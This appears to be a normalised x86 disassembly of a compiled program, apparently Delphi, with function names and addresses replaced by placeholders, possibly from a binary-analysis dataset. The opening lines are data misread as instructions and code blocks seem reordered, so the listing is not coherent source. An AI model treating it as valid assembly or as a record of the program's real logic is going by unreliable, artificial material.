add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x4172
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x18004172 ] al
add [ eax ] al
add [ eax + 0x6c004010 ] bh
xor eax [ eax ]
js r-xdata
add [ eax + eax ] dl
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax + 0xe004173 ] dl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
imul edi [ eax + 0x75 ] r-xdata
fdiv [ edx + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jb r-xdata
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
push esi
test dl dl
je r-xdata
add [ eax ] bl
add [ eax ] al
add [ eax ] bl
jb r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f4c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f4c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
inc eax
add [ eax + 0xe004173 ] ah
push esp
push eax
jb r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403fe8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404458
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov dl [ ebx ]
test dl dl
je r-xdata
sub_4172f0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f4c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f4c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_417348
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403fe8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404458
mov al 0x1
inc ebx
sub_4173a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417417
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405598
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4112c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41741e
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410b84
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405598
mov ecx eax
mov eax esi
pop edx
call sub_40d1f4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405598
sub_417424
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4174ca
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4174d1
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fe8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41af84
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407c60
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_4174ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_414164
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_414164
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413fac
sub_417524
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_414164
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_414164
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_413ff8
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413fac
sub_41756c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_417705
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_4144cc
mov edi eax
xor edx edx
push ebp
push sub_4176e6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4176ed
mov eax [ rw-data ]
call sub_414530
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4176c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_417675
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_414108
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413c54
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41767c
mov eax [ ebp - 0x8 ]
call sub_403124
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410d04
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_4174ec
pop ecx
mov edx esi
mov eax edi
call sub_413ff8
mov eax ebx
call sub_403124
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_417424
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_417524
pop ecx
inc esi
sub_41767c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403124
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414108
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
sub_417714
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4144cc
mov edi eax
xor eax eax
push ebp
push sub_4177af
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414530
retn
mov edx ebx
mov eax edi
call sub_414108
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413ff8
mov eax esi
call sub_403124
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407c60
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4177c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4144cc
mov edi eax
xor eax eax
push ebp
push sub_417837
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414530
retn
mov edx ebx
mov eax edi
call sub_414108
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413ff8
mov eax esi
call sub_403124
sub_417868
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
pop ecx
pop edx
pop ebx
retn
sub_4178ac
push ebx
push esi
push edi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4171ec
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4178e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4197c0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_4198d0
call sub_41785c
sub_41790c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407c60
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403ef8
sub_417940
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407c60
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4197c0
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_417a01
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_417d84
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_417d84
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a08
mov eax [ ebp - 0x8 ]
call sub_403124
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4198d0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41785c
sub_417a30
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_417a50
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404194
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4033a8
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41785c
sub_417ab8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_4144cc
mov esi eax
xor edx edx
push ebp
push sub_417b28
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b2f
mov eax [ rw-data ]
call sub_414530
retn
mov edx ebx
mov eax esi
call sub_414108
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403124
mov edx ebx
mov eax esi
call sub_413ff8
sub_417b34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417c43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c4a
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
xor edx edx
push ebp
push sub_417c26
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c78
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_417348
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414108
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403f90
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_417424
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414108
call sub_417ab8
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414108
mov edx eax
mov eax [ rw-data ]
call sub_414444
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_414254
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_417c54
push ebx
mov ebx eax
mov eax ebx
call sub_417d48
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_416680
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_417c78
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403124
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_414108
call sub_403124
inc edi
dec esi
jne r-xdata
sub_417cb4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_40306c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_41379c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4030b0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413814
mov edi eax
mov edx [ esp + 0x4 ]
call sub_413714
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403088
test al al
jne r-xdata
sub_417d84
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_417dd0
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_417dd0
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
sub_417e20
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_417e6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_419620
mov eax [ ebp - 0x4 ]
call sub_4041b8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e72
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
call sub_41785c
sub_417e78
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_417f18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417a1c
test al al
jne r-xdata
mov eax ebx
call sub_417a1c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_414dbc
jmp r-xdata
mov eax ebx
call sub_417d60
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_418988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f1f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414cf0
mov esi eax
mov eax ebx
call sub_418980
jmp r-xdata
mov eax ebx
call sub_4188d0
mov eax ebx
call sub_417a1c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418aec
mov eax ebx
call sub_418988
sub_417f48
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404cf0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413fac
inc esi
dec ebx
jne r-xdata
sub_417f84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41b0a0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404cf0
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404eac
add esp 0x4
mov edx ebx
mov eax edi
call sub_41b074
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404cf0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41b074
test [ eax + 0x24 ] 0x4
je r-xdata
sub_417ffc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404cf0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_418064
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_418084
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402774
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_418064
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_419ab4
call sub_402774
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403124
sub_4180e4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4181ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419c54
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41819e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4181cf
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_418084
pop ecx
test al al
jne r-xdata
call sub_40392c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038d8
sub_4181f4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41826c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403320
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413c54
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_418271
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
